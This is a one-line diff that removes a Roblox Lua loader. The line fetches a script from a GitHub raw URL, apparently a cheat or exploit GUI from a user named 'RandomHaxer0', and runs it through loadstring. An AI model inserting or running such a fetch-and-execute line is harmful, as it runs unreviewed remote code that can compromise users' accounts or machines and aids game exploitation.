@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomHaxer0/Furry-infection-gui-script/main/Main-Script"))()
